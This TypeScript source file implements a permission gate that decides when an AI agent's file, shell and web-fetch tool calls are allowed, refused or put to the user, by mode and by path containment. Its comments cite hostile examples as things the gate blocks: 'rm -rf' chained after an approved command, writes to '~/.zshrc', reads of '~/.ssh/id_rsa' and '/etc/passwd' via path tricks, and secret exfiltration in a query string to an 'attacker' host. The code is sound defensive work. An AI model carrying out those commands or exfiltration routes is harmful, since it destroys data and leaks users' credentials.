/**
 * The tool permission gate — adapted from abacusai-bot
 * packages/agent/src/permissions.ts (the gateToolCall state machine), for
 * Uni's server-side sessions.
 *
 * Tool approval turns a tool call into the matching PermissionRequest and
 * decides whether the mode needs to ask at all. DEFAULT asks before every
 * mutation; ACCEPTEDITS lets edits through but shell asks; PLAN refuses
 * mutations outright; AUTO skips prompts but stays confined; YOLO never
 * asks. Reads inside the session root never prompt, reads outside it do,
 * since that is the one read that can leak.
 */
import * as path from 'node:path'
import {
  type AgentMode,
  type PermissionRequest,
  type ToolRequest,
} from '@uni/contracts'
import { isWithin, namesSecretFile, secretEntries } from './secrets.js'
import { DEFAULT_UNATTENDED_POLICY, type UnattendedPolicy } from './tool-policy.js'
import { UNATTENDED_TOOLS, UNATTENDED_EXCLUDED_TOOLS } from './tool-policy.js'
import { isInsideDirectory, realPathOf } from './workspace-path.js'
import * as fs from 'node:fs'
import * as os from 'node:os'
import { fileURLToPath as nodeFileURLToPath } from 'node:url'

const UNICODE_SPACES = /[\u00A0\u2000-\u200A\u202F\u205F\u3000]/g

/**
 * Where a file tool's path argument really lands, read the way the file
 * tools read it: unicode spaces made plain, a leading `@` dropped, `~`
 * expanded to home, a `file://` URL made a path, then resolved against the
 * session root. Checking `path.resolve` alone would let `~/.ssh/id_rsa`,
 * `@/etc/passwd` or `file:///etc/passwd` look like files in the root while
 * the tool reads them from elsewhere. A `file:` URL that is not one
 * resolves to null, which callers treat as outside.
 */
export function toolPath(
  raw: string,
  root: string,
): string | null {
  const paths = path.posix
  let value = raw.replace(UNICODE_SPACES, ' ')
  if (value.startsWith('@')) value = value.slice(1)
  if (value === '~') value = os.homedir()
  else if (value.startsWith('~/')) value = paths.join(os.homedir(), value.slice(2))
  else if (/^file:/i.test(value)) {
    try {
      value = fileURLToPath(value)
    } catch {
      return null
    }
  }
  return paths.resolve(root, value)
}

function fileURLToPath(raw: string): string {
  const url = new URL(raw)
  if (url.protocol !== 'file:') throw new TypeError('not a file URL')
  // Node's own conversion: rejects non-localhost hosts the way the file
  // tools read them, exactly like upstream's fileURLToPath call.
  return nodeFileURLToPath(url)
}

/** Tools that change something on disk or run code (upstream MUTATING_TOOLS). */
const MUTATING_TOOLS = new Set(['write', 'edit', 'bash', 'web_fetch'])

/** The write-family tools, for containment checks. */
export const WRITE_TOOLS: ReadonlySet<string> = new Set(['write', 'edit'])

/**
 * Shell syntax that lets a command do more than the approved prefix:
 * separators, pipes, substitution, redirection, newlines. Any of them means
 * no auto-allow: `git status` must not approve `git status; rm -rf .`.
 * Redirection because the prefix is the first word (see allowances) and
 * `git status >> ~/.zshrc` writes any file on disk; `<` because `<(cmd)` is
 * process substitution. A redirect prompting once is the right way to be
 * wrong.
 */
const SHELL_CHAINING = /[;|&`\n<>]|\$\(/

/**
 * The separators a chain is broken on before each part is checked on its
 * own. Without this an approval could never cover `cd repo && git pull`,
 * which is how the agent writes almost every command, and "Always" changed
 * nothing. Safe because every part still has to clear SHELL_CHAINING and
 * match an approved prefix. Quoting is not parsed: a separator inside a
 * string splits into parts matching no prefix, so a wrong parse only costs
 * a prompt.
 */
const CHAIN_SEPARATOR = /&&|\|\||;/

/** The parts of a chained command, in order, with the empties dropped. */
export function shellSegments(command: string): string[] {
  return command
    .split(CHAIN_SEPARATOR)
    .map((segment) => segment.trim())
    .filter((segment) => segment.length > 0)
}

export type Gate =
  /** `credentialPaths`: hidden stores the user already approved, to unhide. */
  | { kind: 'allow'; credentialPaths?: string[] }
  /** Refused outright without asking: PLAN mode's answer to a mutation. */
  | { kind: 'refuse'; reason: string }
  | { kind: 'ask'; request: PermissionRequest }

export interface GateOptions {
  mode: AgentMode
  /** The session root file tools are confined to. */
  root: string
  /** Literal command prefixes the user has pre-approved for this session. */
  allowedCommands: readonly string[]
  /** Non-bash tools the user chose to always allow for this session. */
  allowedTools: readonly string[]
  /** Directories outside the root already allowed for reads. */
  allowedReadPaths: readonly string[]
  /** Directories outside the root already allowed for writes. */
  allowedWritePaths: readonly string[]
  /** Origins the user chose to always allow web_fetch for, this session. */
  allowedOrigins: readonly string[]
  /** An unattended run's declared reach. Without it, refused everything. */
  unattended?: {
    policy: UnattendedPolicy
  }
  /** Clock for deterministic tests. */
  now?: () => number
}

/** Mutable allowance arrays the live run widens as the user approves 'always'. */
export type MutableGateOptions = {
  [K in keyof GateOptions]: GateOptions[K] extends readonly string[] | undefined
    ? string[]
    : GateOptions[K]
}

export function isMutatingTool(toolName: string): boolean {
  return MUTATING_TOOLS.has(toolName)
}

export function gateToolCall(tool: ToolRequest, options: GateOptions): Gate {
  const { mode } = options

  // First, before any allowance: nobody is there to ask, and nothing a
  // session allowed earlier widens a routine's fixed reach.
  if (mode === 'unattended') return gateUnattended(tool, options)

  // Full access means exactly that: no prompts.
  if (mode === 'yolo') return { kind: 'allow' }

  // The one call plan mode must let through: it is how the user is asked
  // to leave it, or the mode is inescapable from the inside.
  if (tool.name === 'exit_plan_mode') {
    if (mode !== 'plan') {
      return {
        kind: 'refuse',
        reason: 'Not in plan mode. You can already make changes, so go ahead.',
      }
    }
    const plan =
      typeof (tool.input as { plan?: unknown })?.plan === 'string'
        ? (tool.input as { plan: string }).plan
        : ''
    return {
      kind: 'ask',
      request: {
        type: 'exit_plan_mode',
        requestId: mintRequestId(tool, options),
        tool,
        displayName: 'Implement the plan',
        planFilePath: '',
        planContent: plan,
        createdAt: nowOf(options),
      },
    }
  }

  if (mode === 'plan' && isMutatingCall(tool)) {
    return {
      kind: 'refuse',
      reason:
        'Plan mode is read-only: no file changes, no shell commands, and no ' +
        'fetches. Investigate and write the plan. When it is ready and the user ' +
        'wants it done, call exit_plan_mode to ask to start: that is how the ' +
        'mode changes. Do not ask them to flip a switch themselves.',
    }
  }

  // bash and web_fetch have their own, narrower allowance stores; a blanket
  // tool-level "always allow" would approve every command and every host.
  if (
    tool.name !== 'bash' &&
    tool.name !== 'web_fetch' &&
    options.allowedTools.includes(tool.name)
  ) {
    return { kind: 'allow' }
  }

  switch (tool.name) {
    case 'read':
    case 'list':
    case 'grep':
      return gateRead(tool, options)
    case 'edit':
    case 'write':
      // Containment first, then the mode: AcceptEdits waves through an
      // edit inside the root, not one anywhere on disk.
      return gateWrite(tool, options)
    case 'bash':
      return gateBash(tool, options)
    case 'web_fetch':
      return gateWebFetch(tool, options)
    default:
      // Unknown mutating tools are caught by MUTATING_TOOLS; everything
      // else runs without a prompt.
      return isMutatingCall(tool)
        ? { kind: 'ask', request: buildGenericRequest(tool, options) }
        : { kind: 'allow' }
  }
}

const refuseUnattended = (reason: string): Gate => ({
  kind: 'refuse',
  reason:
    `Not available in a routine that runs on its own: ${reason}. ` +
    'Do what you can with the tools you have, and say in your answer what was left out.',
})

/**
 * A routine nobody is watching: never asks, and allows only what
 * UNATTENDED_TOOLS names under its rule. A tool not on the list is
 * refused whatever its name.
 */
function gateUnattended(tool: ToolRequest, options: GateOptions): Gate {
  const unattended = options.unattended
  if (unattended == null)
    return refuseUnattended('this run was started without its routine policy')
  const rule = UNATTENDED_TOOLS[tool.name]
  switch (rule) {
    case 'allow':
      return { kind: 'allow' }
    case 'workspace-read':
      if (unattended.policy.files === false)
        return { kind: 'refuse', reason: 'This chat cannot read files.' }
      if (readsSecretFile(tool, options.root))
        return refuseUnattended('it never reads keys, tokens or .env files')
      // The session root only: nothing the session allowed widens it.
      return gateRead(tool, { ...options, allowedReadPaths: [] }).kind === 'allow'
        ? { kind: 'allow' }
        : refuseUnattended('reads stay inside the routine’s folder')
    case 'sources':
      // Always held: the run's prompt alone can carry private data.
      return refuseUnattended(
        'it reads only the exact pages this routine was set up to read, with no query',
      )
    default:
      return refuseUnattended(
        UNATTENDED_EXCLUDED_TOOLS[tool.name] ?? 'it is not on the allowed list',
      )
  }
}

/**
 * Whether THIS call mutates: web_fetch is gated per-origin below, but in
 * plan mode it is refused outright like every other outbound channel.
 */
function isMutatingCall(tool: ToolRequest): boolean {
  return isMutatingTool(tool.name)
}

/**
 * Whether a read names a secret: by file name anywhere in the path, or a
 * credential store the gate hides. Both the spelled and the real path are
 * checked, so a link cannot rename one.
 */
function readsSecretFile(tool: ToolRequest, root: string): boolean {
  const requested = Array.isArray(tool.input.paths)
    ? (tool.input.paths as unknown[]).map(String)
    : [String(tool.input.path ?? '')]
  const stores = secretEntries(os.homedir()).map((entry) => entry.path)
  const rootResolved = path.resolve(root)
  const realRoot = realPathOf(rootResolved) ?? rootResolved
  return requested.some((raw) => {
    const lexical = toolPath(raw, root)
    if (lexical == null) return true
    const real = realPathOf(lexical) ?? lexical
    return (
      [lexical, real].some((candidate) =>
        stores.some((store) => isWithin(candidate, store)),
      ) ||
      namesSecretFile(path.relative(rootResolved, lexical)) ||
      namesSecretFile(path.relative(realRoot, real))
    )
  })
}

/**
 * Fetching a URL is egress, not a read: the model chooses the whole URL,
 * and everything the agent has seen can be packed into a query string, so
 * it must not be that `read .env` prompts while `web_fetch` of
 * `http://attacker/?d=...` does not. Plan mode refuses it outright, since
 * read-only has to hold for the user's secrets and not just their files.
 * Approval is per origin: three pages of one docs site should not be three
 * prompts.
 */
function gateWebFetch(tool: ToolRequest, options: GateOptions): Gate {
  const raw = String(tool.input.url ?? '')

  let origin: string
  try {
    origin = new URL(raw).origin
  } catch {
    // Unparseable never reaches the network (the fetch itself refuses it),
    // so let it through to fail with a message the model can act on.
    return { kind: 'allow' }
  }

  if (options.allowedOrigins.includes(origin)) {
    return { kind: 'allow' }
  }

  return {
    kind: 'ask',
    request: {
      type: 'fetch_url',
      requestId: mintRequestId(tool, options),
      tool,
      displayName: 'Fetch a URL',
      // The full URL, never a summary: an exfiltration payload sits in the
      // query string, so truncating would hide the part worth looking at.
      url: raw,
      origin,
      createdAt: nowOf(options),
    },
  }
}

/** Where a write lands, resolved for the card and the check. */
function writeTarget(
  tool: ToolRequest,
  options: GateOptions,
): { requested: string; resolved: string; inside: boolean } {
  const requested = String(tool.input.path ?? '')
  const landing = toolPath(requested, options.root)
  const resolved = landing ?? requested
  const inside =
    landing != null &&
    (isInsideDirectory(landing, options.root) ||
      options.allowedWritePaths.some((dir) => isInsideDirectory(landing, dir)))
  return { requested, resolved, inside }
}

/** The card for a file tool leaving the session root. */
function outsideWriteRequest(
  tool: ToolRequest,
  requested: string,
  resolved: string,
  options: GateOptions,
): PermissionRequest {
  const base = {
    requestId: mintRequestId(tool, options),
    tool,
    filePath: requested,
    resolvedPath: resolved,
    deducedDirectory: path.dirname(resolved),
    createdAt: nowOf(options),
  }

  if (tool.name === 'write') {
    return {
      ...base,
      type: 'write_outside_directory',
      displayName: 'Write file outside the session root',
      isNewFile: !fs.existsSync(resolved),
    }
  }
  return {
    ...base,
    type: 'edit_outside_directory',
    displayName: 'Edit file outside the session root',
  }
}

function gateWrite(tool: ToolRequest, options: GateOptions): Gate {
  const { requested, resolved, inside } = writeTarget(tool, options)

  if (!inside) {
    return {
      kind: 'ask',
      request: outsideWriteRequest(tool, requested, resolved, options),
    }
  }

  if (options.mode === 'acceptEdits') {
    return { kind: 'allow' }
  }

  switch (tool.name) {
    case 'edit':
      return { kind: 'ask', request: buildEditRequest(tool, options) }
    case 'write':
      return { kind: 'ask', request: buildWriteRequest(tool, options) }
    default:
      return { kind: 'ask', request: buildGenericRequest(tool, options) }
  }
}

function gateRead(tool: ToolRequest, options: GateOptions): Gate {
  // Every path in a batch has to clear the same bar, or ten files at once
  // would be a way around the prompt one at a time would raise.
  const paths = Array.isArray(tool.input.paths)
    ? (tool.input.paths as unknown[]).map(String)
    : [String(tool.input.path ?? '')]

  const outside = paths.find((candidate) => {
    const resolved = toolPath(candidate, options.root)
    return (
      resolved == null ||
      (!isInsideDirectory(resolved, options.root) &&
        !options.allowedReadPaths.some((dir) => isInsideDirectory(resolved, dir)))
    )
  })

  if (outside === undefined) {
    return { kind: 'allow' }
  }

  const requested = outside
  const resolved = toolPath(requested, options.root) ?? requested

  return {
    kind: 'ask',
    request: {
      type: 'read_outside_directory',
      requestId: mintRequestId(tool, options),
      tool,
      displayName: 'Read file outside the session root',
      filePath: requested,
      resolvedPath: resolved,
      deducedDirectory: path.dirname(resolved),
      createdAt: nowOf(options),
    },
  }
}

/**
 * The hidden stores a command names, split by whether the session allowed
 * them.
 */
function namedCredentialStores(
  command: string,
  options: GateOptions,
): { named: string[]; approved: string[] } {
  const home = os.homedir()
  const stores = secretEntries(home).map((entry) => entry.path)
  const named = stores.filter((store) => command.includes(store))
  return { named, approved: [] }
}

function gateBash(tool: ToolRequest, options: GateOptions): Gate {
  const command = String(tool.input.command ?? '')

  const segments = shellSegments(command)

  if (
    segments.length > 0 &&
    segments.every(
      (segment) =>
        !SHELL_CHAINING.test(segment) &&
        options.allowedCommands.some(
          (prefix) => segment === prefix || segment.startsWith(`${prefix} `),
        ),
    )
  ) {
    return { kind: 'allow' }
  }

  return {
    kind: 'ask',
    request: {
      type: 'run_terminal',
      requestId: mintRequestId(tool, options),
      tool,
      displayName: 'Run command',
      command,
      cwd: options.root,
      createdAt: nowOf(options),
    },
  }
}

function buildEditRequest(tool: ToolRequest, options: GateOptions): PermissionRequest {
  const filePath = String(tool.input.path ?? '')
  const absolute = toolPath(filePath, options.root) ?? filePath
  const original = readFileSafe(absolute)
  const oldText = String(tool.input.oldText ?? '')
  const newText = String(tool.input.newText ?? '')

  return {
    type: 'edit_file',
    requestId: mintRequestId(tool, options),
    tool,
    displayName: 'Edit file',
    filePath,
    originalContent: original,
    newContent: applyEdits(original, [{ oldText, newText }]),
    createdAt: nowOf(options),
  }
}

function buildWriteRequest(tool: ToolRequest, options: GateOptions): PermissionRequest {
  const filePath = String(tool.input.path ?? '')
  const absolute = toolPath(filePath, options.root) ?? filePath
  const exists = fs.existsSync(absolute)

  return {
    type: 'write_file',
    requestId: mintRequestId(tool, options),
    tool,
    displayName: exists ? 'Overwrite file' : 'Create file',
    filePath,
    originalContent: exists ? readFileSafe(absolute) : '',
    content: String(tool.input.content ?? ''),
    isNewFile: !exists,
    createdAt: nowOf(options),
  }
}

function buildGenericRequest(tool: ToolRequest, options: GateOptions): PermissionRequest {
  return {
    type: 'generic',
    requestId: mintRequestId(tool, options),
    tool,
    displayName: tool.name,
    toolName: tool.name,
    inputSummary: summarize(tool.input),
    createdAt: nowOf(options),
  }
}

/**
 * Preview an edit so the approval prompt can show a real diff: replace
 * via index splicing, never String.replace — `$&` and friends in a
 * replacement string are pattern syntax to replace() and would corrupt
 * the preview.
 */
function applyEdits(
  original: string,
  edits: ReadonlyArray<{ oldText: string; newText: string }>,
): string {
  let result = original
  for (const edit of edits) {
    if (!edit.oldText) continue
    const first = result.indexOf(edit.oldText)
    if (first === -1) continue
    result =
      result.slice(0, first) + edit.newText + result.slice(first + edit.oldText.length)
  }
  return result
}

function readFileSafe(absolutePath: string): string {
  try {
    return fs.readFileSync(absolutePath, 'utf8')
  } catch {
    return ''
  }
}

function summarize(input: Record<string, unknown>): string {
  const summary = JSON.stringify(input)
  return summary.length > 400 ? `${summary.slice(0, 400)}…` : summary
}

function mintRequestId(tool: ToolRequest, options: GateOptions): string {
  const now = nowOf(options)
  return `pr_${tool.id}_${now}`
}

function nowOf(options: GateOptions): number {
  return options.now ? options.now() : Date.now()
}

export { DEFAULT_UNATTENDED_POLICY }
